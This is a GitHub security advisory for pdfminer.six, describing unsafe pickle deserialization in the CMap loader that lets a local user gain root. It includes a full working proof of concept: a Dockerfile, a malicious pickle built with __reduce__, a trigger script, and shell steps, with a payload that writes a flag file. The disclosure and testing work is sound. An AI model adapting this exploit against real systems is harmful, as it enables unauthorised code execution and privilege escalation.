# [H] Insecure Deserialization (pickle) in pdfminer.six CMap Loader — Local Privesc

## Summary
Severity: High
Advisory: GHSA-f83h-ghpp-7wcc
CVE: CVE-2025-70559
CWE: CWE-502, CWE-915
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-11-07
Source: https://github.com/advisories/GHSA-f83h-ghpp-7wcc
Type: github-advisory

## Affected
- PyPI: `pdfminer.six` — affected >=0 <20251230

## Details
### 🚀 Overview

This report **demonstrates a real-world privilege escalation** vulnerability in [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due to unsafe usage of Python's `pickle` module for CMap file loading.
It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

## 🚨 Special Note

This advisory addresses a distinct vulnerability from [GHSA-wf5f-4jwr-ppcp (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp).

While the previous CVE claims to mitigate issues related to unsafe deserialization, the patch introduced in commit [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086) does not address the vulnerability reported here.

Based on testing performed against the latest version of the library ([comparison view](https://github.com/pdfminer/pdfminer.six/compare/20250506...20251107)), the issue remains exploitable through local privilege escalation due to continued unsafe use of pickle files. The **Dockerfile** is hence modified to run test against this claim.

This demonstrates that the patch for **CVE-2025-64512** is incomplete: the vulnerability remains exploitable. This advisory therefore documents a distinct, independently fixable flaw. A correct remediation must remove the dependency on pickle files (or otherwise eliminate unsafe deserialization) and replace it with a safe, auditable data-handling approach so the library can operate normally without relying on ```pickle```

## 📚 Table of Contents

- [🔍 Background](#-background)
- [🐍 Vulnerability Description](#-vulnerability-description)
- [🎭 Demo Scenario](#-demo-scenario)
- [🧨 Technical Details](#-technical-details)
- [🔧 Setup and Usage](#-setup-and-usage)
- [📝 Step-by-step Walkthrough](#-step-by-step-walkthrough)
- [🛡️ Security Standards & References](#-security-standards--references)
---

## 🔍 Background

**pdfminer.six** is a popular Python library for extracting text and information from PDF files. It supports CJK (Chinese, Japanese, Korean) fonts via external CMap files, which it loads from disk using Python's `pickle` module.

> 🐍 **Security Issue:**
> If the CMap search path (`CMAP_PATH` or default directories) includes a world-writable or user-writable directory, an attacker can place a malicious `.pickle.gz` file that will be loaded and deserialized by pdfminer.six, leading to arbitrary code execution.

---

### 🐍 Vulnerability Description

- **Component:** pdfminer.six CMap loading (`pdfminer/cmapdb.py`)
- **Issue:** Loads and deserializes `.pickle.gz` files using Python’s `pickle` module, which is unsafe for untrusted data.
- **Exploitability:** If a low-privileged user can write to any directory in `CMAP_PATH`, they can execute code as the user running pdfminer—potentially root or a privileged service.
- **Impact:** Full code execution as the service user, privilege escalation from user to root, persistence, and potential lateral movement.

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)
### 🎭 Demo Scenario

**Environment:**
- 🐧 Alpine Linux (Docker container)
- 👨‍💻 Two users:
  - `user1` (attacker: low-privilege)
  - `root` (victim: runs privileged PDF-processing script)
- 🗂️ Shared writable directory: `/tmp/uploads`
- 🛣️ `CMAP_PATH` set to `/tmp/uploads` for the privileged script
- 📦 pdfminer.six installed system-wide

**Attack Flow:**
1. 🕵️‍♂️ `user1` creates a malicious CMap file (`Evil.pickle.gz`) in `/tmp/uploads`.
2. 👑 The privileged service (`root`) processes a PDF or calls `get_cmap("Evil")`.
3. 💣 The malicious pickle is deserialized, running arbitrary code as root.
4. 🎯 The exploit creates a flag file in `/root/pwnedByPdfminer` as proof.

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

### 🧨 Technical Details

- **Vulnerability Type:** Insecure deserialization of untrusted data using Python's `pickle`
- **Attack Prerequisites:** Attacker can write to a directory included in `CMAP_PATH`
- **Vulnerable Line:**
  ```python
  return type(str(name), (), pickle.loads(gzfile.read()))
  ```
  *In `pdfminer/cmapdb.py`'s `_load_data` method*
- https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfminer/cmapdb.py#L246
- **Proof of Concept:** See `createEvilPickle.py`, `evilmod.py`, and `processPdf.py`

**Exploit Chain:**
- Attacker places a malicious `.pickle.gz` file in the CMap search path.
- Privileged process (e.g., root) loads a CMap, triggering pickle deserialization.
- Arbitrary code executes with the privilege of the process (root/service account).

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

## 🔧 Setup and Usage

### 📁 Files
#### </> Dockerfile
```yml
FROM python:3.11-alpine

ARG PM_COMMIT=b808ee05dd7f0c8ea8ec34bdf394d40e63501086

# Install git and build tooling
RUN apk add --no-cache git build-base

WORKDIR /opt

# Clone pdfminer.six and check out the specific commit, then install from source
RUN git clone https://github.com/pdfminer/pdfminer.six.git && \
    cd pdfminer.six && \
    git fetch --all && \
    git checkout ${PM_COMMIT} && \
    pip install --no-cache-dir -e .

# App working directory for PoC
WORKDIR /app

# Create low-privilege user and uploads dir
RUN adduser -D user1 && \
    mkdir -p /tmp/uploads && \
    chown user1:user1 /tmp/uploads && \
    chmod 1777 /tmp/uploads

# Copy PoC files
COPY evilmod.py /app/evilmod.py
COPY createEvilPickle.py /app/createEvilPickle.py
COPY processPDF.py /app/processPDF.py

ENV CMAP_PATH=/tmp/uploads
ENV PYTHONUNBUFFERED=1

# Keep the container running in background so you can exec into it anytime.
CMD ["tail", "-f", "/dev/null"]

```

#### </> evilmod.py
```python
import os

def evilFunc():
    with open("/root/pwnedByPdfminer", "w") as f:
        f.write("ROOTED by pdfminer pickle RCE\n")
    return {"CODE2CID": {}, "IS_VERTICAL": False}
```
#### </> createEvilPickle.py
```python
import pickle
import gzip
from evilmod import evilFunc

class Evil:
    def __reduce__(self):
        return (evilFunc, ())

payload = pickle.dumps(Evil())
with gzip.open("/tmp/uploads/Evil.pickle.gz", "wb") as f:
    f.write(payload)

print("Malicious pickle created at /tmp/uploads/Evil.pickle.gz")
```
#### </> processPDF.py
```python
import os
from pdfminer.cmapdb import CMapDB

os.environ["CMAP_PATH"] = "/tmp/uploads"

CMapDB.get_cmap("Evil")

print("CMap loaded. If vulnerable, /root/pwnedByPdfminer will be created.")
```
![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

### 1️⃣ Build and start the demo container

```bash
docker build -t pdfminer-priv-esc-demo .
docker run --rm -it --name pdfminer-demo pdfminer-priv-esc-democ
```

### 2️⃣ In the container, open two shells in parallel (or switch users in one):

#### 🕵️‍♂️ Shell 1 (Attacker: user1)
```bash
su user1
cd /app
python createEvilPickle.py
# ✅ Confirms: /tmp/uploads/Evil.pickle.gz is created and owned by user1
```

#### 👑 Shell 2 (Victim: root)
```bash
cd /app
python processPdf.py
# 🎯 Output: If vulnerable, /root/pwnedByPdfminer will be created
```

### 3️⃣ Proof of escalation

```bash
cat /root/pwnedByPdfminer
# 🏴 Output: ROOTED by pdfminer pickle RCE
```

<img width="815" height="889" alt="proof-of-exploit" src="https://github.com/user-attachments/assets/f465d17c-a3af-49c5-9dbc-eec9635b36fc" />

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

## 📝 Step-by-step Walkthrough

1. **user1** uses `createEvilPickle.py` to craft and place a malicious CMap pickle in a shared upload directory.
2. The **root** user runs a typical PDF-processing script, which loads CMap files from that directory.
3. The exploit triggers, running arbitrary code as root.
4. The attacker now has proof of code execution as root (and, in a real attack, could escalate further).

![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)

## 🛡️ Security Standards & References

- **CVSS (Common Vulnerability Scoring System):**
  - **Base Score:** 7.8 (High)
  - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

- **OWASP Top 10:**
  - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
  - [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)

- **MITRE CWE References:**
  - [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
  - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

- **MITRE ATT&CK Techniques:**
  - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)
  - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)

## References
- https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-f83h-ghpp-7wcc
- https://nvd.nist.gov/vuln/detail/CVE-2025-70559
- https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086
- https://github.com/pdfminer/pdfminer.six
